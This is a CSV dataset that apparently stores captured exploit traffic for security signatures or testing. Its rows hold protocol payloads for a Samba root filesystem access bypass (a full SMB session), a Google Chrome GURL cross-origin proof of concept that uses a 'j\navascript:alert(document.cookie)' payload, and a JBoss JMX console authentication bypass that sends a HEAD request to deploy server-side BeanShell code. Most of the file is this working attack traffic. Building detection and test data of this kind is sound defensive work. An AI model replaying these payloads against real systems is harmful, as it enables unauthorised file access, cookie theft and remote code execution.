XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||80 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0E 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||(||FF ||SMB||10 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0F 00 00 05 00 04 ||\||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMBq||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 10 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,"||00 00 00 ||||FF ||SMBr||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A 00 00 01 00 11 07 00 03 ||2||00 01 00 04 ||A||00 00 00 00 01 00 0D ||N||00 00 FD F3 80 80 80 22 19 82 ||6p||C9 01 ||,||01 00 3A 00 ||dhcp44||00 00 00 00 00 00 00 00 00 00 ||`(||06 06 ||+||06 01 05 05 02 A0 1E ||0||1C A0 0E ||0||0C 06 0A ||+||06 01 04 01 82 ||7||02 02 0A A3 0A ||0||08 A0 06 1B 04 ||NONE"
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 01 ||0||FF ||SMBs||16 00 00 C0 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A ||d||00 02 00 04 FF 00 00 00 00 00 C9 00 05 01 A1 81 C6 ||0||81 C3 A0 03 0A 01 01 A1 0C 06 0A ||+||06 01 04 01 82 ||7||02 02 0A A2 81 AD 04 81 AA ||NTLMSSP||00 02 00 00 00 0C 00 0C 00 ||0||00 00 00 15 02 8A ||`P$||D2 ||z%||A8 87 ||x||00 00 00 00 00 00 00 00 ||n||00 ||n||00 ||<||00 00 00 ||D||00 ||H||00 ||C||00 ||P||00 ||4||00 ||4||00 02 00 0C 00 ||D||00 ||H||00 ||C||00 ||P||00 ||4||00 ||4||00 01 00 0C 00 ||D||00 ||H||00 ||C||00 ||P||00 ||4||00 ||4||00 04 00 1A 00 ||v||00 ||r||00 ||t||00 ||.||00 ||t||00 ||e||00 ||l||00 ||u||00 ||s||00 ||.||00 ||c||00 ||o||00 ||m||00 03 00 ||(||00 ||d||00 ||h||00 ||c||00 ||p||00 ||4||00 ||4||00 ||.||00 ||v||00 ||r||00 ||t||00 ||.||00 ||t||00 ||e||00 ||l||00 ||u||00 ||s||00 ||.||00 ||c||00 ||o||00 ||m||00 00 00 00 00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 || ||00 ||3||00 ||.||00 ||2||00 ||.||00 ||4||00 ||-||00 ||0||00 ||.||00 ||2||00 ||2||00 00 00 ||M||00 ||Y||00 ||G||00 ||R||00 ||O||00 ||U||00 ||P||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMBsm||00 00 C0 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A ||d||00 03 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||f||FF ||SMBs||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A ||e||00 04 00 03 FF 00 00 00 01 00 ||=||00 00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 || ||00 ||3||00 ||.||00 ||2||00 ||.||00 ||4||00 ||-||00 ||0||00 ||.||00 ||2||00 ||2||00 00 00 ||M||00 ||Y||00 ||G||00 ||R||00 ||O||00 ||U||00 ||P||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||6||FF ||SMBu||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 05 00 03 FF 00 00 00 01 00 0D 00 ||A||3A 00 ||N||00 ||T||00 ||F||00 ||S||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||10 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 06 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||10 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 07 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 A8 FF ||SMB2||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 08 00 0A 0A 00 ||d||00 00 00 0A 00 ||8||00 00 00 ||d||00 ||D||00 00 00 00 00 ||q||00 00 FD FF 01 00 01 00 00 00 00 00 00 00 ||d||00 00 00 00 00 00 00 00 D3 ||(||13 10 ||p||C9 01 00 D3 ||(||13 10 ||p||C9 01 00 C5 ||+||81 ||%p||C9 01 00 C5 ||+||81 ||%p||C9 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||e||00 ||t||00 ||c||00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||-||FF ||SMB||80 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 09 00 05 F0 9A 00 04 00 02 ||SO||00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||10 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0A 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||10 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0B 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||-||FF ||SMB||80 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0E 00 05 F0 9A 00 04 00 02 ||SO||00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||10 00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0F 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMBq||00 00 00 00 88 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 10 00 00 00 00||
﻿FSC20100428-03_Google_Chrome_GURL_Cross_Origin_Bypass.xml,Google Chrome GURL Cross Origin Bypass,"Google Chrome web browser contains a Cross Origin Bypass vulnerability. The vulnerability is due to insufficient validation of URLs in the Google URL (GURL) component, which can lead to violation of the same origin policy. Remote attackers can exploit this vulnerability by enticing target users to visit a malicious website. Successful exploitation of this vulnerability can result in information disclosure and execution of active content outside the prescribed context.",HTTP/HTTPS,TCP,"GET /~mkhainson/poc.html HTTP/1.1||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || keep-alive||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.1||3B || en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1059 Safari/532.5||0D 0A ||Accept||3A || application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate,sdch||0D 0A ||Accept-Language||3A || en-US,en||3B ||q=0.8||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.3||0D 0A 0D 0A||"
FSC20100428-03_Google_Chrome_GURL_Cross_Origin_Bypass.xml,Google Chrome GURL Cross Origin Bypass,"Google Chrome web browser contains a Cross Origin Bypass vulnerability. The vulnerability is due to insufficient validation of URLs in the Google URL (GURL) component, which can lead to violation of the same origin policy. Remote attackers can exploit this vulnerability by enticing target users to visit a malicious website. Successful exploitation of this vulnerability can result in information disclosure and execution of active content outside the prescribed context.",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Fri, 28 May 2010 15||3A ||38||3A ||47 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Fri, 28 May 2010 15||3A ||38||3A ||23 GMT||0D 0A ||ETag||3A || ||22 ||58f8fdb-132-487a94c1c79c0||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 306||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<head><title>TELUS Security Labs</title></head>||0D 0A ||<body>||0D 0A 0D 0A ||<h3>TELUS Security Labs PoC</h3>||0D 0A 0D 0A ||<iframe name=||22 ||test||22 || src=||22 ||http||3A ||//www.google.ca/language_tools?hl=en||22 ||></iframe> ||0D 0A ||<input type=button value=||22 ||test||22 || onclick=||22 ||window.open('j\navascript||3A ||alert(document.cookie)','test')||22 || >||0D 0A 0D 0A ||</body>||0D 0A ||</html>||0D 0A||"
﻿FSC20100510-01_RedHat_JBoss_Enterprise_Application_Platform_JMX_Console_Authentication_Bypass.xml,RedHat JBoss Enterprise Application Platform JMX Console Authentication Bypass,"An authentication bypass vulnerability has been reported in JBoss Enterprise Application Platform JMX Console application. The vulnerability is caused by the authentication policy within the application that only enforces restrictions for GET and POST methods, other HTTP request verbs bypass authentication. Unauthenticated remote attackers could exploit this vulnerability to gain administrative access to JBoss JMX management console and to upload and execute arbitrary Java code within the security context of the JBoss server process, normally SYSTEM on Windows platforms.",HTTP,TCP,HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.deployer%3Aservice%3DBSHDeployer&methodName=createScriptDeployment&argType=java.lang.String&arg0=%20%20%20%20import%20java.io.%2A%3B%0A%20%20%20%20File%20f%3B%0A%20%20%20%20try%20%7B%0A%09theos%3DSystem.getProperty%28%22os.name%22%29%3B%0A%09if%28theos.startsWith%28%22Windows%22%29%29%7B%0A%09%20%20%20%20f%3Dnew%20File%28%22c%3A%2Fpoc.txt%22%29%3B%0A%09%7D%20else%20%7B%0A%09%20%20%20%20f%3Dnew%20File%28%22%2Ftmp%2Fpoc.txt%22%29%3B%0A%09%7D%0A%09if%28%21f.exists%28%29%29%7B%0A%09f.createNewFile%28%29%3B%0A%09System.out.println%28%22New%20file%20poc.txt%20has%20been%20created%22%29%3B%0A%09%7D%0A%09else%20%7B%0A%09System.out.println%28%22File%20poc.txt%20exists%22%29%3B%0A%09%7D%0A%20%20%20%20%7D%20catch%20%28%20IOException%20e%29%20%7B%0A%09System.out.println%28%22Encountered%20error%3A%20%22%20%2B%20e%29%3B%0A%20%20%20%20%7D&argType=java.lang.String&arg1=soap HTTP/1.0||0A ||Set-Cookie||3A || Some-Cookie||3B 0A 0A||
